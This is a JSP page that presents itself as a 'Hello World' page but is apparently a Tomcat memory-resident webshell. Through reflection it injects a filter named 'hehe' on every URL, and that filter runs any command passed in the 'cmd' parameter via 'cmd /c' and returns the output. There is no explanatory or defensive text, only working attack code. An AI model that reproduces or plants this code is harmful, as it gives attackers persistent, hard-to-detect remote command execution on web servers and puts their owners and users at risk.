<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.deploy.FilterDef" %>
<%@ page import="org.apache.catalina.deploy.FilterMap" %><%--
  Created by IntelliJ IDEA.
  User: Administrator
  Date: 2021/7/25
  Time: 8:49
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--<%--%>
<%--    HttpServletRequest request1 = request;--%>

<%--%>--%>

<html>
<head>
    <title>com.kyo.hello</title>
</head>
<body>
<%
    Field req = request.getClass().getDeclaredField("request");
    req.setAccessible(true);
    Request request1 = (Request) req.get(request);
    StandardContext context = (StandardContext) request1.getContext();
    Filter filter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {

        }

        @Override
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) request;
            String attack;
            if((attack = request.getParameter("cmd")) != null){
                String[] strings =new String[]{"cmd", "/c", attack};
                InputStream in = Runtime.getRuntime().exec(strings).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "Empty data";
                System.out.println(output);
                response.setContentType("text/html;charset=GBK");
                response.getWriter().write("<pre>" + output + "</pre>");
                response.getWriter().flush();
            }
            chain.doFilter(request, response);
        }

        @Override
        public void destroy() {

        }
    };
    FilterDef filterdef = new FilterDef();
    filterdef.setFilterName("hehe");
    filterdef.setFilterClass(filter.getClass().getName());
    filterdef.setFilter(filter);
    context.addFilterDef(filterdef);
    FilterMap filterMap = new FilterMap();
    filterMap.setFilterName(filterdef.getFilterName());
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    filterMap.addURLPattern("/*");
    context.addFilterMapBefore(filterMap);
    context.filterStart();
%>
    <h1>Hello World</h1>
</body>
</html>